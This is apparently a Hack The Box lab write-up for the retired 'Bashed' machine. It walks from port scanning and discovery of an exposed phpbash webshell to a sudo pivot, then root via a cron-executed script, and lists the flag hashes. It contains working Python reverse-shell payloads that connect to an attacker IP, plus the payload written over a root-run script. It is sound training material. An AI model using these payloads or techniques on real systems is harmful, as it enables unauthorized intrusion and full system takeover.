# Bashed

> **Hack The Box | Linux | Easy**
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 16.04.2 LTS |
| **Difficulty** | Easy |
| **Category** | Linux / Web Exploitation / Cron Abuse |
| **IP Address** | 10.129.42.127 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: port 80 only |: |
| 2 | Directory brute-force: `/dev/phpbash.php` discovered |: |
| 3 | phpbash webshell: unauthenticated RCE | `www-data` |
| 4 | `sudo -l` → `www-data` can run anything as `scriptmanager` NOPASSWD |: |
| 5 | Python reverse shell via sudo: stable TTY as scriptmanager | `scriptmanager` |
| 6 | Ownership inference: root executing writable `/scripts/test.py` |: |
| 7 | Overwrite `test.py` with reverse shell: wait for cron | `root` |

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA bashed 10.129.42.127
```

```
# Nmap 7.98 scan initiated Sat May  9 05:57:53 2026
Nmap scan report for 10.129.42.127
Host is up (0.20s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 651.30 seconds
```

**Key findings:**

- Single service: port 80 only. SSH is not exposed; no SMB, no FTP
- Apache 2.4.18 on Ubuntu: no known direct CVE for this version
- Page title: `Arrexel's Development Site`: suggests a developer's personal project or test environment

With only one service, the entire attack surface is HTTP. Web enumeration is mandatory.

### Web Application: Manual Review

Visiting `http://10.129.42.127/`:

The homepage is a developer blog. One post specifically describes **phpbash**: a PHP webshell the developer built and tested directly on this server. The post mentions it was developed and used on `arrexel.com`.

> This is an OSINT hint built into the machine: the developer advertised the exact tool and the fact it was tested locally. Always read web application content before reaching for tools.

### Directory Brute-Force: Gobuster

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir -u http://10.129.42.127 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -o gobuster.txt \
  -t 40
```

```
===============================================================
Gobuster v3.5
===============================================================
[+] Url:                     http://10.129.42.127
[+] Threads:                 40
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Extensions:              php,txt,html
[+] Status codes:            200,204,301,302,307,401,403
===============================================================
/images               (Status: 301)
/uploads              (Status: 301)
/php                  (Status: 301)
/css                  (Status: 301)
/dev                  (Status: 301) [→ http://10.129.42.127/dev/]
/js                   (Status: 301)
/fonts                (Status: 301)
===============================================================
```

```
/phpbash.php          (Status: 200)
/phpbash.min.php      (Status: 200)
```

**`/dev/phpbash.php`**: interactive PHP webshell, directly accessible with no authentication.

---

## Initial Access: phpbash Webshell

Navigating to `http://10.129.42.127/dev/phpbash.php` presents a fully functional interactive bash terminal in the browser.

```
www-data@bashed:/var/www/html/dev#
```

The webshell runs commands via PHP's `exec()` / `system()` functions. It renders output inline in the browser.

### System Fingerprint

```bash
www-data@bashed:/var/www/html/dev# id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@bashed:/var/www/html/dev# uname -a
```

```
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
www-data@bashed:/var/www/html/dev# cat /etc/lsb-release
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
```

---

## Privilege Escalation: www-data → scriptmanager

### Step 1: sudo Enumeration (First Command After Foothold)

```bash
www-data@bashed:/var/www/html/dev# sudo -l
```

```
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

**Critical finding:** `www-data` can execute **any command** as `scriptmanager` without a password.

This is a sudo misconfiguration. Privilege escalation is not always a single jump to root: this is a lateral step:

```
www-data → scriptmanager → (root via another vector)
```

### Step 2: Verify sudo Rights Before Spawning Shell

The webshell is a pseudo-TTY: spawned interactive processes exit immediately. Before attempting a shell pivot, confirm the sudo rights actually work:

```bash
www-data@bashed:/var/www/html/dev# sudo -u scriptmanager whoami
```

```
scriptmanager
```

Confirmed: command execution as `scriptmanager` works. The issue is not permissions; it is the absence of a proper TTY.

**Key distinction:**

```
Permission issue ≠ shell issue
```

Attempting `sudo -u scriptmanager /bin/bash` in the webshell returns immediately with no output: `bash` spawns and exits before the browser receives output. Never mistake a TTY limitation for a failed privilege escalation.

### Step 3: Spawn Reverse Shell as scriptmanager

Upgrade from the webshell to a proper interactive shell by running a Python reverse shell through sudo. This bypasses the TTY limitation entirely.

Start the listener on the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

Execute from the webshell:

```bash
www-data@bashed:/var/www/html/dev# sudo -u scriptmanager python -c \
  'import socket,subprocess,os;
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(("10.10.16.236",4444));
   os.dup2(s.fileno(),0);
   os.dup2(s.fileno(),1);
   os.dup2(s.fileno(),2);
   subprocess.call(["/bin/bash","-i"])'
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.42.127 42316

scriptmanager@bashed:/var/www/html/dev$
```

Proper interactive shell as `scriptmanager`. Upgrade to a full PTY:

```bash
scriptmanager@bashed:/var/www/html/dev$ python -c 'import pty; pty.spawn("/bin/bash")'
scriptmanager@bashed:/var/www/html/dev$
```

---

## Privilege Escalation: scriptmanager → root

### Step 1: Enumeration as scriptmanager

```bash
scriptmanager@bashed:/$ id
```

```
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

```bash
scriptmanager@bashed:/$ sudo -l
```

```
We dont have password so need to look SUID binaries
```

No further sudo rights. Enumerate SUID binaries, cron jobs, and interesting directories:

```bash
scriptmanager@bashed:/$ find / -perm -4000 -type f 2>/dev/null
```

```
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
/bin/ping6
/bin/ping
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

No unusual SUID binaries: standard Ubuntu set, nothing exploitable via GTFOBins here.

```bash
scriptmanager@bashed:/$ ls -la /
```

```
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           3840 May  9 05:33 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
...
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
...
```

**`/scripts`**: owned by `scriptmanager:scriptmanager` with `drwxrwxr--`. This directory exists at the filesystem root: unusual. Its name directly reflects the current user's purpose.

### Step 2: Investigate /scripts

```bash
scriptmanager@bashed:/$ ls -la /scripts/
```

```
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May  9 06:25 test.txt
```

**Critical observation:**

| File | Owner | Last Modified |
|---|---|---|
| `test.py` | `scriptmanager:scriptmanager` | Dec 4 2017 (static) |
| `test.txt` | `root:root` | **May 9 06:25** (recent, updating) |

`test.txt` is owned by root and its modification timestamp is current: it was written recently. `scriptmanager` cannot create root-owned files. Therefore, **something running as root is executing `test.py`** and that execution is creating/overwriting `test.txt`.

Read the script:

```bash
scriptmanager@bashed:/scripts$ cat test.py
```

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

The script opens `test.txt` for writing and writes a string. When root executes this, the resulting `test.txt` is owned by root. The timestamp on `test.txt` confirms this runs on a schedule: approximately every minute.

**Inference confirmed:**

```
Root-owned cron job → executes /scripts/test.py → creates root-owned test.txt
scriptmanager owns test.py → scriptmanager can overwrite it
```

This was **not** visible in `/etc/crontab`:

```bash
scriptmanager@bashed:/scripts$ cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ...
47 6    * * *   root    test -x /usr/sbin/anacron || ...
52 6    1 * *   root    test -x /usr/sbin/anacron || ...
```

The cron entry is not in the system crontab: it is in root's crontab (`/var/spool/cron/crontabs/root`), which requires root to read. The clue is entirely in the file ownership behaviour. This is behavioral enumeration: inferring execution from observed artefacts rather than reading configuration files directly.

### Step 3: Overwrite test.py with Reverse Shell

Start a second listener on the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 5555
```

Overwrite `test.py`:

```bash
scriptmanager@bashed:/scripts$ cat > test.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.236",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
```

Verify the overwrite:

```bash
scriptmanager@bashed:/scripts$ cat test.py
```

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.236",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

Wait for the cron to fire (≤ 60 seconds):

```
Listening on 0.0.0.0 5555
Connection received on 10.129.42.127 55840

root@bashed:/scripts#
```

```bash
root@bashed:/scripts# id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## Flag Collection

### user.txt

```bash
root@bashed:/scripts# find / -name user.txt 2>/dev/null
/home/arrexel/user.txt

root@bashed:/scripts# cat /home/arrexel/user.txt
```

```
ce8846eef0495ad457fd55e7c73cd9fa
```

### root.txt

```bash
root@bashed:/scripts# cat /root/root.txt
```

```
cf37e46838acf7991729c951bef70b98
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/arrexel/user.txt` | `ce8846eef0495ad457fd55e7c73cd9fa` |
| **root.txt** | `/root/root.txt` | `cf37e46838acf7991729c951bef70b98` |

---

## Full Attack Chain Reference

```
[Recon] nmap -sS -sV -sC -p- → port 80 only, Apache 2.4.18, "Arrexel's Development Site"
    │
    ├─[Web] Homepage mentions phpbash developed and tested on this server
    │
    ├─[Dirb] gobuster → /dev/phpbash.php (Status: 200)
    │
    └─[Foothold] phpbash.php → unauthenticated webshell → www-data
            │
            └─[sudo -l] → (scriptmanager : scriptmanager) NOPASSWD: ALL
                    │
                    ├─[Verify] sudo -u scriptmanager whoami → scriptmanager ✓
                    │
                    └─[Pivot] sudo -u scriptmanager python reverse shell → scriptmanager TTY
                            │
                            └─[Enumerate] ls -la / → /scripts owned by scriptmanager
                                    │
                                    └─[Infer] test.txt owned by root + updating = root executes test.py
                                            │
                                            └─[Overwrite] test.py → Python reverse shell
                                                    │
                                                    └─[Cron fires] → root shell
                                                            │
                                                            ├─ user.txt → /home/arrexel/
                                                            └─ root.txt → /root/
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA bashed 10.129.42.127` | Full TCP scan |
| `gobuster dir -u http://10.129.42.127 -w directory-list-2.3-medium.txt -x php` | Web directory brute-force |
| `gobuster dir -u http://10.129.42.127/dev -x php` | Enumerate /dev specifically |
| `sudo -l` | Check sudo permissions: run first on every shell |
| `sudo -u scriptmanager whoami` | Verify sudo rights without spawning interactive shell |
| `sudo -u scriptmanager python -c 'import socket...'` | Reverse shell via sudo as scriptmanager |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to full PTY |
| `find / -perm -4000 -type f 2>/dev/null` | SUID binary enumeration |
| `ls -la /` | Check root filesystem for unusual directories |
| `ls -la /scripts/` | Observe file ownership: spot root-owned output from scriptmanager-owned script |
| `cat test.py` | Understand what the script does |
| `cat > test.py << 'EOF' ... EOF` | Overwrite with malicious payload |
| `nc -lvnp 5555` | Catch root reverse shell |
| `cat /home/arrexel/user.txt` | Read user flag |
| `cat /root/root.txt` | Read root flag |

---

## Lessons Learned

**1. Web content is recon: read it before running tools.**
The homepage explicitly described phpbash and stated it was developed and run on this exact server. That's a direct path to the webshell before running a single dirbuster scan. CTF machines often hide the key hint in plain text.

**2. sudo -l is mandatory on every new shell: immediately.**
A NOPASSWD sudo entry for an intermediate user is a complete lateral movement path. This machine would have taken much longer without checking sudo rights in the first 30 seconds. Make it muscle memory.

**3. Permission failure ≠ sudo failure: know your shell type.**
`sudo -u scriptmanager /bin/bash` appearing to fail in the webshell is a TTY issue, not a permissions issue. Always verify with a direct command (`whoami`) before concluding sudo doesn't work. Confusing a shell limitation with a privilege limitation wastes significant time.

**4. Behavioral enumeration outperforms configuration-file enumeration.**
The root cron job was invisible in `/etc/crontab`. The only way to find it was through the file ownership mismatch: a root-owned file being updated in a directory owned by the current user, generated by a script the current user can write. Timestamps and ownership are evidence of execution. Read them like logs.

**5. Core privilege escalation formula: memorise it:**

```
Attacker controls file
+ Privileged process executes that file
= Privilege escalation
```

This pattern appears in cron jobs, systemd timers, CI/CD pipelines, backup scripts, log rotation, and cleanup automation. Every time you find a writable file, ask: *what privileged process might execute this?*

**6. Intermediate user pivots are common and often overlooked.**
The path here was `www-data → scriptmanager → root`, not `www-data → root`. Many beginners get stuck because they expect a single jump. Lateral movement between unprivileged users is a valid and frequent step: treat every new user account as a fresh starting point for privilege enumeration.

---

## References

- [phpbash: GitHub](https://github.com/Arrexel/phpbash)
- [GTFOBins: python](https://gtfobins.github.io/gtfobins/python/)
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Cron Job Abuse: HTB Academy Module 25](https://academy.hackthebox.com/module/details/51)

---

*HTB Retired Machine: Bashed | Completed May 2026 | Flags included per HTB retired machine policy.*
